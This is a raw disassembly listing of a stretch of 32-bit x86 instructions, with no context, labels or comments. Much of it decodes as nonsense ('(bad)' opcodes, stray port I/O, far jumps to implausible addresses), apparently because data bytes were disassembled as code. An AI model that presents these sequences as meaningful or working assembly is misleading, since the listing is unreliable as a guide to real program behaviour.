  41bb49:	add    esi,DWORD PTR [ecx]
  41bb4b:	mov    edi,esp
  41bb4d:	xor    DWORD PTR [ecx],0x9
  41bb50:	pop    es
  41bb51:	test   BYTE PTR [ecx+0x9],al
  41bb54:	out    0x3,eax
  41bb56:	and    DWORD PTR [ecx+0x92103c7],ecx
  41bb5c:	mov    DWORD PTR [ebx],0xe7893100
  41bb62:	add    esi,DWORD PTR [ecx]
  41bb64:	or     edi,esp
  41bb66:	add    DWORD PTR [ecx+0x9],0xffffffc7
  41bb6a:	xor    DWORD PTR [ecx],0x9
  41bb6d:	out    0x83,eax
  41bb6f:	inc    ecx
  41bb70:	mov    DWORD PTR [eax],eax
  41bb72:	jmp    0xc9c1d4a9
  41bb77:	mov    dl,0x8
  41bb79:	add    cl,ch
  41bb7b:	xor    cl,BYTE PTR [ecx]
  41bb7d:	add    BYTE PTR [ecx],cl
  41bb7f:	mov    ch,0x18
  41bb81:	add    BYTE PTR [ecx],cl
  41bb83:	sub    eax,0x32e98019
  41bb88:	sbb    DWORD PTR [eax],eax
  41bb8a:	or     DWORD PTR [ebp+0x32e98008],ebp
  41bb90:	sbb    DWORD PTR [eax-0x7fe74d17],eax
  41bb96:	jmp    0xe941c44d
  41bb9b:	xor    bl,BYTE PTR [ecx]
  41bb9d:	sub    cl,0xb2
  41bba0:	or     BYTE PTR [eax+0x932c9],al
  41bba6:	leave  
  41bba7:	mov    dl,0x19
  41bba9:	or     cl,0xb2
  41bbac:	sbb    DWORD PTR [eax],eax
  41bbae:	leave  
  41bbaf:	xor    cl,BYTE PTR [ecx]
  41bbb1:	add    cl,ch
  41bbb3:	mov    dl,0x9
  41bbb5:	add    cl,ch
  41bbb7:	xor    cl,BYTE PTR [ecx]
  41bbb9:	or     BYTE PTR [ecx],0xad
  41bbbc:	or     DWORD PTR [eax],eax
  41bbbe:	jmp    0xe9c1d575
  41bbc3:	add    BYTE PTR [edx],dh
  41bbc5:	sbb    DWORD PTR [eax],eax
  41bbc7:	or     DWORD PTR ds:0x2d098009,esi
  41bbcd:	sbb    DWORD PTR [eax],eax
  41bbcf:	or     DWORD PTR [ebp+0x2d098009],esi
  41bbd5:	or     DWORD PTR [eax+0x193509],eax
  41bbdb:	jmp    0xe941d592
  41bbe0:	xor    cl,BYTE PTR [ecx]
  41bbe2:	add    cl,ch
  41bbe4:	mov    dl,0x9
  41bbe6:	or     cl,0xb2
  41bbe9:	or     DWORD PTR [eax],eax
  41bbeb:	add    BYTE PTR [eax+0x68800008],bl
  41bbf1:	or     BYTE PTR [eax],dl
  41bbf3:	sub    BYTE PTR [eax-0x78],0x10
  41bbf7:	sbb    BYTE PTR [eax-0x7fffef78],0xe
  41bbfe:	add    BYTE PTR [eax],al
  41bc00:	mov    BYTE PTR [esi],cl
  41bc02:	add    cl,BYTE PTR [eax]
  41bc04:	mov    BYTE PTR [eax],cl
  41bc06:	add    BYTE PTR [eax],al
  41bc08:	push   eax
  41bc09:	or     BYTE PTR [edx],al
  41bc0b:	or     BYTE PTR [eax+0xe],bl
  41bc0e:	add    BYTE PTR [eax],cl
  41bc10:	dec    eax
  41bc11:	or     BYTE PTR [eax],al
  41bc13:	add    BYTE PTR [eax+0xe],dl
  41bc16:	add    al,BYTE PTR [eax]
  41bc18:	pop    eax
  41bc19:	push   cs
  41bc1a:	add    BYTE PTR [eax],cl
  41bc1c:	inc    eax
  41bc1d:	or     BYTE PTR [edx],al
  41bc1f:	add    BYTE PTR [eax+0x8],al
  41bc22:	add    BYTE PTR [eax],cl
  41bc24:	push   eax
  41bc25:	or     BYTE PTR [eax],al
  41bc27:	or     BYTE PTR [eax],al
  41bc29:	sbb    BYTE PTR [eax],cl
  41bc2b:	add    al,BYTE PTR [eax]
  41bc2d:	and    BYTE PTR [esi],cl
  41bc2f:	add    cl,BYTE PTR [eax]
  41bc31:	and    BYTE PTR [eax],cl
  41bc33:	add    al,BYTE PTR [eax]
  41bc35:	or     BYTE PTR [eax],cl
  41bc37:	add    cl,BYTE PTR [eax]
  41bc39:	adc    BYTE PTR [esi],cl
  41bc3b:	add    BYTE PTR [eax],al
  41bc3d:	sbb    BYTE PTR [eax],cl
  41bc3f:	add    BYTE PTR [eax],cl
  41bc41:	add    BYTE PTR [eax],cl
  41bc43:	add    BYTE PTR [eax],al
  41bc45:	or     BYTE PTR [esi],cl
  41bc47:	add    cl,BYTE PTR [eax]
  41bc49:	fmul   DWORD PTR ds:0xdd80000
  41bc4f:	add    al,BYTE PTR [eax]
  41bc51:	enter  0x207,0x8
  41bc55:	rol    BYTE PTR [edi],1
  41bc57:	add    cl,BYTE PTR [eax]
  41bc59:	ror    BYTE PTR ds:0xdc00002,1
  41bc5f:	add    BYTE PTR [eax],cl
  41bc61:	enter  0x20d,0x0
  41bc65:	xor    DWORD PTR [edx],esi
  41bc67:	add    DWORD PTR [edx],eax
  41bc69:	xor    DWORD PTR [edx],ebp
  41bc6b:	add    eax,DWORD PTR [eax]
  41bc6d:	cmp    DWORD PTR [edx],edi
  41bc6f:	add    DWORD PTR [eax],eax
  41bc71:	xor    DWORD PTR [edx],edi
  41bc73:	add    eax,DWORD PTR [edx]
  41bc75:	sub    DWORD PTR [edx],esi
  41bc77:	add    eax,DWORD PTR [eax]
  41bc79:	xor    DWORD PTR [edx],esi
  41bc7b:	add    DWORD PTR [eax],eax
  41bc7d:	cmp    DWORD PTR [edx],esi
  41bc7f:	add    eax,DWORD PTR [edx]
  41bc81:	sub    DWORD PTR [edx],esi
  41bc83:	add    DWORD PTR [eax],eax
  41bc85:	sub    DWORD PTR [edx],ebp
  41bc87:	add    DWORD PTR [edx],eax
  41bc89:	xor    DWORD PTR [edx],ebp
  41bc8b:	add    eax,DWORD PTR [eax]
  41bc8d:	add    BYTE PTR [ecx],dh
  41bc8f:	xor    al,BYTE PTR [ecx]
  41bc91:	add    dh,BYTE PTR [ecx]
  41bc93:	xor    al,BYTE PTR [ebx]
  41bc95:	add    ch,BYTE PTR [ecx]
  41bc97:	xor    al,BYTE PTR [ebx]
  41bc99:	add    BYTE PTR [ecx],bh
  41bc9b:	xor    al,BYTE PTR [ecx]
  41bc9d:	add    BYTE PTR [ecx],dh
  41bc9f:	xor    al,BYTE PTR [ebx]
  41bca1:	add    BYTE PTR [ecx],dh
  41bca3:	cmp    al,BYTE PTR [ecx]
  41bca5:	add    dh,BYTE PTR [ecx]
  41bca7:	sub    al,BYTE PTR [ebx]
  41bca9:	add    bh,BYTE PTR [ecx]
  41bcab:	xor    BYTE PTR [ebx],al
  41bcad:	add    BYTE PTR [ecx],bh
  41bcaf:	cmp    BYTE PTR [ecx],al
  41bcb1:	add    BYTE PTR [ecx],ch
  41bcb3:	xor    BYTE PTR [ebx],al
  41bcb5:	add    BYTE PTR [ecx],dh
  41bcb7:	xor    BYTE PTR [ecx],al
  41bcb9:	add    BYTE PTR [ecx],dh
  41bcbb:	sub    BYTE PTR [ecx],al
  41bcbd:	add    bh,BYTE PTR [ecx]
  41bcbf:	cmp    BYTE PTR [ebx],al
  41bcc1:	add    BYTE PTR [ecx],ch
  41bcc3:	xor    BYTE PTR [ecx],al
  41bcc5:	add    dh,BYTE PTR [ecx]
  41bcc7:	xor    BYTE PTR [ecx],al
  41bcc9:	add    BYTE PTR [ecx],bh
  41bccb:	sub    BYTE PTR [ebx],al
  41bccd:	add    bh,BYTE PTR [ecx]
  41bccf:	cmp    BYTE PTR [ecx],al
  41bcd1:	add    BYTE PTR [ecx],dh
  41bcd3:	cmp    BYTE PTR [ebx],al
  41bcd5:	add    dh,BYTE PTR [ecx]
  41bcd7:	xor    BYTE PTR [ebx],al
  41bcd9:	add    dh,BYTE PTR [ecx]
  41bcdb:	sub    BYTE PTR [ecx],al
  41bcdd:	add    BYTE PTR [ecx],bh
  41bcdf:	or     edi,esp
  41bce1:	add    esi,DWORD PTR [ebx]
  41bce3:	adc    edi,ebp
  41bce5:	add    eax,0x5df1131
  41bcea:	xor    DWORD PTR [ecx],ecx
  41bcec:	out    0x3,eax
  41bcee:	xor    edx,DWORD PTR [ecx]
  41bcf0:	out    dx,eax
  41bcf1:	add    eax,0xef093300
  41bcf6:	add    esi,DWORD PTR [ecx]
  41bcf8:	or     edi,ebx
  41bcfa:	add    esi,DWORD PTR [ebx]
  41bcfc:	adc    edi,esp
  41bcfe:	add    eax,0x23e80933
  41bd03:	mov    cl,0x9
  41bd05:	push   0x68093123
  41bd0a:	and    esi,DWORD PTR [ecx]
  41bd0c:	or     DWORD PTR [edi+0x3],esp
  41bd0f:	xor    DWORD PTR [ecx],ecx
  41bd11:	and    esi,DWORD PTR [bx+di+0x6809]
  41bd16:	add    esi,DWORD PTR [ecx-0x4efc17f7]
  41bd1c:	or     eax,ebp
  41bd1e:	and    esi,DWORD PTR [ecx]
  41bd20:	or     edi,esp
  41bd22:	add    esi,DWORD PTR [ecx]
  41bd24:	or     edi,esp
  41bd26:	and    esi,DWORD PTR [ecx-0x4edc18f7]
  41bd2c:	or     BYTE PTR [eax+0x23],ch
  41bd2f:	mov    cl,0x8
  41bd31:	push   0xe7093103
  41bd36:	add    esi,DWORD PTR [ecx]
  41bd38:	or     DWORD PTR [edi+0x3],esp
  41bd3b:	mov    cl,0x8
  41bd3d:	call   0xe84a6e45
  41bd42:	add    esi,DWORD PTR [ecx]
  41bd44:	or     edi,esp
  41bd46:	and    esi,DWORD PTR [ecx]
  41bd48:	or     edi,esp
  41bd4a:	add    esi,DWORD PTR [ecx-0x4edc17f8]
  41bd50:	or     BYTE PTR [edi+0x4],ah
  41bd53:	xor    DWORD PTR [ecx],ecx
  41bd55:	out    0x3,eax
  41bd57:	add    BYTE PTR [ecx+0x12e80008],dh
  41bd5d:	or     DWORD PTR [eax],eax
  41bd5f:	imul   ecx,DWORD PTR ds:0x35680009,0x32e80089
  41bd69:	or     DWORD PTR [eax],eax
  41bd6b:	imul   edx,DWORD PTR [ebp+0x9],0x892d6900
  41bd72:	add    cl,ch
  41bd74:	push   edx
  41bd75:	or     DWORD PTR [eax],eax
  41bd77:	imul   ecx,DWORD PTR [ebp-0x77],0x89556800
  41bd7e:	add    BYTE PTR [eax+0x2d],ch
  41bd81:	or     DWORD PTR [eax],eax
  41bd83:	imul   esi,DWORD PTR ds:0x32e80089,0x12e90089
  41bd8d:	mov    DWORD PTR [eax],eax
  41bd8f:	push   0x6800890d
  41bd94:	xor    eax,0x32e90009
  41bd99:	or     DWORD PTR [eax],eax
  41bd9b:	jmp    0xe941c6d2
  41bda0:	adc    cl,BYTE PTR [ecx+0x9156900]
  41bda6:	add    BYTE PTR [ecx+0x2d],ch
  41bda9:	mov    DWORD PTR [eax],eax
  41bdab:	push   0xe8008935
  41bdb0:	xor    cl,BYTE PTR [ecx]
  41bdb2:	add    al,ch
  41bdb4:	push   edx
  41bdb5:	mov    DWORD PTR [eax],eax
  41bdb7:	push   0x6800094d
  41bdbc:	add    BYTE PTR [ebp+0x9],dl
  41bdbf:	add    BYTE PTR [ecx+0x2d],ch
  41bdc2:	or     DWORD PTR [eax],eax
  41bdc4:	push   0x68008952
  41bdc9:	xor    cl,BYTE PTR [ecx]
  41bdcb:	add    al,ch
  41bdcd:	xor    cl,BYTE PTR [ecx]
  41bdcf:	add    cl,ch
  41bdd1:	adc    cl,BYTE PTR [ecx]
  41bdd3:	add    BYTE PTR [eax],al
  41bdd5:	leave  
  41bdd6:	or     al,0x80
  41bdd8:	add    cl,cl
  41bdda:	in     al,dx
  41bddb:	(bad)  
  41bddc:	call   FWORD PTR [eax-0x14]
  41bddf:	jg     0x41bde1
  41bde1:	pop    ecx
  41bde2:	or     al,0x80
  41bde4:	add    cl,cl
  41bde6:	in     al,dx
  41bde7:	(bad)  
  41bde8:	dec    DWORD PTR [eax-0x14]
  41bdeb:	(bad)  
  41bdec:	call   FWORD PTR [eax-0x66ff7ff4]
  41bdf2:	in     al,dx
  41bdf3:	jg     0x41bdf5
  41bdf5:	or     BYTE PTR [eax+eax*1],cl
  41bdf8:	add    BYTE PTR [eax-0x67ff7ff4],cl
  41bdfe:	in     al,dx
  41bdff:	(bad)  
  41be00:	call   FWORD PTR [eax]
  41be02:	in     al,dx
  41be03:	jg     0x41be05
  41be05:	mov    BYTE PTR ds:0x5880000,al
  41be0b:	or     BYTE PTR [edx],al
  41be0d:	pop    eax
  41be0e:	or     al,0x8
  41be10:	add    bl,BYTE PTR [eax+0x5]
  41be13:	add    BYTE PTR [edx+0x48],al
  41be16:	or     al,0x8
  41be18:	add    BYTE PTR [eax+0x5],cl
  41be1b:	add    BYTE PTR [eax],al
  41be1d:	pop    eax
  41be1e:	or     al,0x0
  41be20:	inc    eax
  41be21:	add    BYTE PTR [eax+0xc],bl
  41be24:	or     BYTE PTR [edx],al
  41be26:	dec    eax
  41be27:	add    eax,0xc484008
  41be2c:	or     BYTE PTR [eax],al
  41be2e:	sbb    BYTE PTR ds:0x5180200,al
  41be34:	or     BYTE PTR [eax+0x8],al
  41be37:	add    eax,0xc084200
  41be3c:	or     BYTE PTR [edx+0x18],al
  41be3f:	add    eax,0xc180008
  41be44:	add    BYTE PTR [eax+0x8],al
  41be47:	or     al,0x0
  41be49:	add    cl,BYTE PTR [eax]
  41be4b:	or     al,0x8
  41be4d:	inc    eax
  41be4e:	xor    DWORD PTR [edx],esi
  41be50:	add    DWORD PTR [eax],ecx
  41be52:	jno    0x41be86
  41be54:	add    DWORD PTR [eax],eax
  41be56:	xor    DWORD PTR [edx],esi
  41be58:	add    al,BYTE PTR [eax]
  41be5a:	jno    0x41be8e
  41be5c:	add    cl,BYTE PTR [eax]
  41be5e:	jae    0x41be92
  41be60:	add    cl,BYTE PTR [eax]
  41be62:	jae    0x41be96
  41be64:	add    al,BYTE PTR [eax]
  41be66:	xor    esi,DWORD PTR [edx]
  41be68:	add    DWORD PTR [eax],ecx
  41be6a:	jae    0x41be9e
  41be6c:	add    al,BYTE PTR [eax]
  41be6e:	icebp  
  41be6f:	xor    DWORD PTR [ecx],eax
  41be71:	add    BYTE PTR [ecx],dh
  41be73:	xor    al,BYTE PTR [ecx]
  41be75:	add    bl,dh
  41be77:	xor    DWORD PTR [edx],eax
  41be79:	or     BYTE PTR [ebx],dh
  41be7b:	xor    al,BYTE PTR [ecx]
  41be7d:	add    BYTE PTR [ebx],dh
  41be7f:	xor    al,BYTE PTR [ecx]
  41be81:	add    bl,dh
  41be83:	xor    DWORD PTR [edx],eax
  41be85:	or     BYTE PTR [eax],al
  41be87:	xor    DWORD PTR [edx],esi
  41be89:	add    DWORD PTR [eax],ecx
  41be8b:	xor    DWORD PTR [edx],esi
  41be8d:	add    al,BYTE PTR [eax]
  41be8f:	repz xor DWORD PTR [edx],eax
  41be92:	add    BYTE PTR [ecx],dh
  41be94:	xor    al,BYTE PTR [ecx]
  41be96:	add    BYTE PTR [ebx],dh
  41be98:	xor    al,BYTE PTR [ecx]
  41be9a:	add    cl,dh
  41be9c:	xor    DWORD PTR [ecx],eax
  41be9e:	or     BYTE PTR [ebx],dh
  41bea0:	xor    al,BYTE PTR [edx]
  41bea2:	add    bl,dh
  41bea4:	xor    DWORD PTR [edx],eax
  41bea6:	or     cl,dh
  41bea8:	xor    DWORD PTR [edx],eax
  41beaa:	add    BYTE PTR [ebx],dh
  41beac:	xor    al,BYTE PTR [ecx]
  41beae:	add    BYTE PTR [ecx+0x30],dh
  41beb1:	add    DWORD PTR [eax],ecx
  41beb3:	jae    0x41bee5
  41beb5:	add    cl,BYTE PTR [eax]
  41beb7:	xor    esi,DWORD PTR [eax]
  41beb9:	add    cl,BYTE PTR [eax]
  41bebb:	jno    0x41beed
  41bebd:	add    al,BYTE PTR [eax]
  41bebf:	xor    DWORD PTR [eax],esi
  41bec1:	add    DWORD PTR [eax],eax
  41bec3:	xor    esi,DWORD PTR [eax]
  41bec5:	add    DWORD PTR [eax],ecx
  41bec7:	jae    0x41bed2
  41bec9:	out    0x2,eax
  41becb:	sub    ebx,ecx
  41becd:	out    0x2,al
  41becf:	cmp    DWORD PTR [ecx],ecx
  41bed1:	out    0x3,eax
  41bed3:	xor    ebx,ecx
  41bed5:	out    0x2,al
  41bed7:	sub    ebx,ecx
  41bed9:	out    0x3,al
  41bedb:	sub    DWORD PTR [ebx],ecx
  41bedd:	out    0x3,eax
  41bedf:	xor    DWORD PTR [ecx],ecx
  41bee1:	out    0x3,eax
  41bee3:	cmp    ecx,ecx
  41bee5:	out    0x3,al
  41bee7:	xor    ebx,ecx
  41bee9:	out    0x2,al
  41beeb:	add    BYTE PTR [ecx],ch
  41beed:	or     edi,esp
  41beef:	add    dh,BYTE PTR [ecx]
  41bef1:	or     esp,edi
  41bef3:	add    dh,BYTE PTR [ecx]
  41bef5:	leave  
  41bef6:	out    0x3,al
  41bef8:	sub    DWORD PTR [ecx],ecx
  41befa:	out    0x3,eax
  41befc:	xor    DWORD PTR [ecx],ecx
  41befe:	out    0x3,eax
  41bf00:	cmp    ecx,ecx
  41bf02:	out    0x2,al
  41bf04:	cmp    DWORD PTR [ebx],ecx
  41bf06:	out    0x2,eax
  41bf08:	xor    ecx,ecx
  41bf0a:	test   BYTE PTR [ebx],0x31
  41bf0d:	jmp    0xe932c2f8
  41bf12:	out    0xc3,al
  41bf14:	ds test bx,0xe91e
  41bf1a:	out    0x3,al
  41bf1c:	icebp  
  41bf1d:	call   0x972c2f8
  41bf22:	xlat   BYTE PTR ds:[ebx]
  41bf23:	ret    
  41bf24:	push   es
  41bf25:	jmp    0x932c310
  41bf2a:	out    0xc3,eax
  41bf2c:	ss push ds
  41bf2e:	test   ebx,0x3e7096e
  41bf34:	jno    0x41bf3f
  41bf36:	test   DWORD PTR [ebx],0x3d6e931
  41bf3c:	jno    0x41bf47
  41bf3e:	out    0xc3,eax
  41bf40:	push   cs
  41bf41:	push   ds
  41bf42:	add    cl,ch
  41bf44:	xor    cl,BYTE PTR [ecx]
  41bf46:	and    cl,bl
  41bf48:	repnz cmp eax,0x932e9fd
  41bf4e:	add    cl,bh
  41bf50:	add    BYTE PTR [edx],dh
  41bf52:	leave  
  41bf53:	(bad)  
  41bf54:	clc    
  41bf55:	repnz cmp eax,0x3df2e91d
  41bf5b:	std    
  41bf5c:	jmp    0xd941bd53
  41bf61:	repnz cmp eax,0x932d91d
  41bf67:	add    cl,bl
  41bf69:	xor    cl,cl
  41bf6b:	pop    ds
  41bf6c:	stc    
  41bf6d:	xor    cl,cl
  41bf6f:	pop    ds
  41bf70:	jmp    0xf941c8a7
  41bf75:	jb     0x41bf74
  41bf77:	(bad)  
  41bf78:	call   0xd961bcef
  41bf7d:	jb     0x41bfbc
  41bf7f:	std    
  41bf80:	jmp    0xe941bcf7
  41bf85:	jb     0x41bf84
  41bf87:	pop    ds
  41bf88:	jmp    0xe961c8bf
  41bf8d:	jb     0x41bfcc
  41bf8f:	sbb    eax,0x932f9
  41bf94:	stc    
  41bf95:	xor    cl,cl
  41bf97:	pop    ds
  41bf98:	jmp    0xd941bd0f
  41bf9d:	jb     0x41bf9c
  41bf9f:	pop    ds
  41bfa0:	jmp    0xd94188d7
  41bfa5:	jb     0x41bfe4
  41bfa7:	std    
  41bfa8:	fnstenv [edx]
  41bfaa:	or     DWORD PTR [eax],esp
  41bfac:	jmp    0xe94188e3
  41bfb1:	repnz cmp al,0x1d
  41bfb4:	jmp    0x204af1b9
  41bfb9:	stc    
  41bfba:	repnz cmp al,0xfd
  41bfbd:	add    al,bh
  41bfbf:	or     BYTE PTR [eax],al
  41bfc1:	and    al,ch
  41bfc3:	dec    eax
  41bfc4:	cmp    eax,0x3d491820
  41bfc9:	add    BYTE PTR [eax],cl
  41bfcb:	or     DWORD PTR [eax+0x20],eax
  41bfce:	clc    
  41bfcf:	dec    eax
  41bfd0:	cmp    eax,0x3d48d800
  41bfd5:	and    al,bl
  41bfd7:	or     BYTE PTR [eax],al
  41bfd9:	add    al,bl
  41bfdb:	or     BYTE PTR [eax+0x20],al
  41bfde:	clc    
  41bfdf:	or     BYTE PTR [eax],al
  41bfe1:	add    al,bl
  41bfe3:	dec    eax
  41bfe4:	std    
  41bfe5:	(bad)  
  41bfe6:	fmul   DWORD PTR [eax]
  41bfe8:	inc    eax
  41bfe9:	and    al,bl
  41bfeb:	dec    eax
  41bfec:	cmp    eax,0xfd48c800
  41bff1:	jmp    FWORD PTR [eax-0x57ffbff8]
  41bff7:	dec    eax
  41bff8:	std    
  41bff9:	pop    ds
  41bffa:	mov    BYTE PTR [eax],cl
  41bffc:	add    BYTE PTR [eax],al
  41bffe:	mov    BYTE PTR [eax+0x3d],cl
  41c001:	and    BYTE PTR [eax+0x68200008],bl
  41c007:	or     BYTE PTR [eax+0x0],al
  41c00a:	pop    eax
  41c00b:	dec    eax
  41c00c:	std    
  41c00d:	pop    ds
  41c00e:	mov    BYTE PTR [eax],cl
  41c010:	and    BYTE PTR [eax],al
  41c012:	pop    edx
  41c013:	or     BYTE PTR [eax],ah
  41c015:	add    al,0x5a
  41c017:	inc    eax
  41c018:	std    
  41c019:	add    eax,DWORD PTR [eax]
  41c01b:	dec    eax
  41c01c:	or     BYTE PTR [eax],al
  41c01e:	add    BYTE PTR [eax+0x40],cl
  41c021:	std    
  41c022:	call   FWORD PTR [edx+0x40]
  41c025:	std    
  41c026:	add    ebx,DWORD PTR [edx+0x40]
  41c029:	sbb    eax,0x1d404800
  41c02e:	add    al,0x4a
  41c030:	inc    eax
  41c031:	sbb    eax,0x20081804
  41c036:	add    BYTE PTR [ecx],dh
  41c038:	xor    al,BYTE PTR [ecx]
  41c03a:	add    BYTE PTR [ecx],dh
  41c03c:	xor    BYTE PTR [ecx],al
  41c03e:	add    BYTE PTR ds:0x31000130,ch
  41c044:	xor    al,BYTE PTR [ecx]
  41c046:	add    BYTE PTR ds:0x35200130,ch
  41c04c:	xor    cl,bh
  41c04e:	push   esi
  41c050:	xor    ecx,edi
  41c052:	push   DWORD PTR [edx]
  41c054:	xor    cl,bh
  41c056:	pop    ds
  41c057:	xor    DWORD PTR [eax],esi
  41c059:	add    DWORD PTR [eax],esp
  41c05b:	xor    DWORD PTR [edx],esi
  41c05d:	stc    
  41c05e:	push   DWORD PTR [edx]
  41c060:	xor    BYTE PTR [ecx],al
  41c062:	add    BYTE PTR ds:0x2d200132,dh
  41c068:	xor    bh,cl
  41c06a:	pop    ds
  41c06b:	xor    eax,0x31200130
  41c070:	xor    al,BYTE PTR [ecx]
  41c072:	and    BYTE PTR ds:0xa6fff932,dh
  41c078:	das    
  41c079:	stc    
  41c07a:	call   FWORD PTR [esi+0x1ff92f]
  41c080:	sub    eax,0x311ff932
  41c085:	xor    BYTE PTR [ecx],al
  41c087:	add    BYTE PTR [ecx],dh
  41c089:	xor    al,BYTE PTR [ecx]
  41c08b:	add    BYTE PTR ds:0x311ff932,dh
  41c091:	xor    al,BYTE PTR [ecx]
  41c093:	add    BYTE PTR ds:0x311ff932,dh
  41c099:	xor    al,BYTE PTR [ecx]
  41c09b:	and    BYTE PTR [ecx],dh
  41c09d:	xor    cl,bh
  41c09f:	push   DWORD PTR [edx]
  41c0a1:	xor    cl,bh
  41c0a3:	push   DWORD PTR [edx]
  41c0a5:	xor    BYTE PTR [ecx],al
  41c0a7:	and    BYTE PTR ds:0x35200130,ch
  41c0ad:	xor    BYTE PTR [ecx],al
  41c0af:	add    BYTE PTR [ecx],dh
  41c0b1:	or     ecx,ebp
  41c0b3:	add    edx,DWORD PTR [ecx+0x9]
  41c0b6:	out    0x3,eax
  41c0b8:	xor    DWORD PTR ds:0x71efbe7,eax
  41c0be:	out    0x3,eax
  41c0c0:	push   ecx
  41c0c1:	or     edi,esp
  41c0c3:	sti    
  41c0c4:	cs add eax,0x3b06fbe9
  41c0ca:	jmp    0xe74adfca
  41c0cf:	sti    
  41c0d0:	push   ss
  41c0d1:	add    eax,0x3aeefbe9
  41c0d6:	jmp    0xe946f1de
  41c0db:	sti    
  41c0dc:	ds add eax,0x51103e7
  41c0e2:	out    0xfb,eax
  41c0e4:	add    BYTE PTR [esi],ch
  41c0e6:	or     edi,esp
  41c0e8:	add    esi,DWORD PTR [ecx]
  41c0ea:	or     ecx,ebp
  41c0ec:	add    esi,DWORD PTR [ecx]
  41c0ee:	or     ecx,ebp
  41c0f0:	sti    
  41c0f1:	push   ss
  41c0f2:	add    eax,0x93103e7
  41c0f7:	jmp    0xe74b07f7
  41c0fc:	add    edx,DWORD PTR [ecx+0x5]
  41c0ff:	out    0xfb,eax
  41c101:	xchg   esi,eax
  41c102:	cmp    ch,cl
  41c104:	add    esi,DWORD PTR [ecx]
  41c106:	add    eax,0x686fbe7
  41c10b:	out    0xfb,eax
  41c10d:	jle    0x41c149
  41c10f:	jmp    0xa74b1217
  41c114:	rep outs dx,BYTE PTR ds:[esi]
  41c116:	or     ah,bh
  41c118:	repz data16 cmp ah,bh
  41c11c:	add    esi,DWORD PTR ds:0x32f3a709
  41c122:	sbb    edi,esp
  41c124:	add    esi,DWORD PTR [ecx]
  41c126:	sbb    DWORD PTR [edi+0xa46f3],esp
  41c12c:	test   eax,0xe9000932
  41c131:	xor    cl,BYTE PTR [ecx]
  41c133:	adc    BYTE PTR [ecx-0x16ffface],ch
  41c139:	xor    al,BYTE PTR ds:0x622a910
  41c13f:	adc    cl,ch
  41c141:	and    al,BYTE PTR [esi]
  41c143:	add    cl,ch
  41c145:	add    al,BYTE PTR [esi]
  41c147:	adc    BYTE PTR [ecx+0x60200],ch
  41c14d:	jmp    0xaa3efb54
  41c152:	xor    cl,BYTE PTR [ecx]
  41c154:	add    cl,ch
  41c156:	xor    al,BYTE PTR ds:0x92d2910
  41c15c:	adc    cl,ch
  41c15e:	loop   0x41c199
  41c160:	or     eax,0xfd39dd29
  41c165:	jmp    0x2941c72c
  41c16a:	sub    eax,0x35290005
  41c16f:	add    eax,0x5c2e910
  41c174:	adc    BYTE PTR [ecx],ch
  41c176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c177:	cmp    ebp,edi
  41c179:	jmp    0xe941cab0
  41c17e:	xor    cl,BYTE PTR [ecx]
  41c180:	add    BYTE PTR [ecx],ch
  41c182:	sub    eax,0x35291005
  41c187:	or     DWORD PTR [eax],edx
  41c189:	jmp    0x294efb10
  41c18e:	test   DWORD PTR ds:0x532e900,eax
  41c194:	add    BYTE PTR [ecx-0x16fffa9e],ch
  41c19a:	xor    al,BYTE PTR ds:0x562e900
  41c1a0:	adc    cl,ch
  41c1a2:	bound  edi,QWORD PTR [ecx]
  41c1a4:	std    
  41c1a5:	add    BYTE PTR [eax-0x67fffffb],bl
  41c1ab:	add    eax,0x48001004
  41c1b0:	xor    eax,0x3588fffd
  41c1b5:	add    DWORD PTR [eax],eax
  41c1b7:	sbb    BYTE PTR ds:0xcd80ffd,bh
  41c1bd:	add    BYTE PTR [eax],al
  41c1bf:	enter  0xc,0x10
  41c1c3:	or     BYTE PTR ds:0xcd81004,cl
  41c1c9:	add    al,0x10
  41c1cb:	sbb    BYTE PTR ds:0xd081000,cl
  41c1d1:	add    al,0x0
  41c1d3:	enter  0xfd3c,0xf
  41c1d7:	fmul   DWORD PTR [eax+eax*1]
  41c1da:	add    BYTE PTR [eax],bl
  41c1dc:	cmp    eax,0xd081001
  41c1e1:	add    al,0x0
  41c1e3:	or     BYTE PTR ds:0xcd81000,cl
  41c1e9:	add    al,0x10
  41c1eb:	fdivr  DWORD PTR [edi*8-0x2c2f7f1]
  41c1f2:	bswap  eax
  41c1f4:	or     al,0x0
  41c1f6:	add    BYTE PTR [eax+0x3d],bl
  41c1f9:	add    DWORD PTR [eax],edx
  41c1fb:	cwde   
  41c1fc:	cmp    al,0x1
  41c1fe:	add    BYTE PTR [eax+0x4800013c],cl
  41c204:	cmp    eax,0x3d58fffd
  41c209:	std    
  41c20a:	call   FWORD PTR [eax+0xd]
  41c20d:	add    al,0x0
  41c20f:	mov    BYTE PTR [eax+eax*1],cl
  41c212:	adc    BYTE PTR [eax],al
  41c214:	mov    BYTE PTR [ecx+eax*1],bh
  41c217:	adc    BYTE PTR [eax+0x58fffe4f],bh
  41c21d:	or     al,0x0
  41c21f:	add    BYTE PTR [ecx],dh
  41c221:	and    al,BYTE PTR [ecx]
  41c223:	add    BYTE PTR [ecx],dh
  41c225:	jp     0x41c2a2
  41c227:	dec    DWORD PTR [esi+0x32]
  41c22a:	test   bh,bh
  41c22c:	inc    esi
  41c22d:	jle    0x41c1b0
  41c22f:	(bad)  
  41c230:	and    al,BYTE PTR ds:[ecx]
  41c233:	add    BYTE PTR [ecx],dh
  41c235:	and    al,BYTE PTR [ecx]
  41c237:	add    BYTE PTR [ecx],dh
  41c239:	int3   
  41c23a:	jp     0x41c23b
  41c23c:	es cs jg 0x41c23f
  41c240:	push   ds
  41c241:	mov    dl,0x80
  41c243:	call   DWORD PTR [esi]
  41c245:	and    al,BYTE PTR [ecx]
  41c247:	add    BYTE PTR [ecx],dh
  41c249:	and    al,BYTE PTR [ecx]
  41c24b:	add    BYTE PTR [ecx],dh
  41c24d:	xor    bh,BYTE PTR [edi+edi*8-0x2]
  41c251:	inc    ecx
  41c252:	jg     0x41c253
  41c254:	neg    cl
  41c256:	cmp    bh,0xee
  41c259:	and    DWORD PTR [ecx],eax
  41c25b:	add    BYTE PTR [ecx],dh
  41c25d:	and    al,BYTE PTR [ecx]
  41c25f:	add    BYTE PTR [ecx],dh
  41c261:	xchg   esi,eax
  41c262:	jnp    0x41c263
  41c264:	(bad)  
  41c265:	or     DWORD PTR [edx-0x7b863101],eax
  41c26b:	inc    esi
  41c26d:	and    DWORD PTR [ecx],eax
  41c26f:	add    BYTE PTR [ecx],dh
  41c271:	and    al,BYTE PTR [ecx]
  41c273:	add    BYTE PTR [ecx],dh
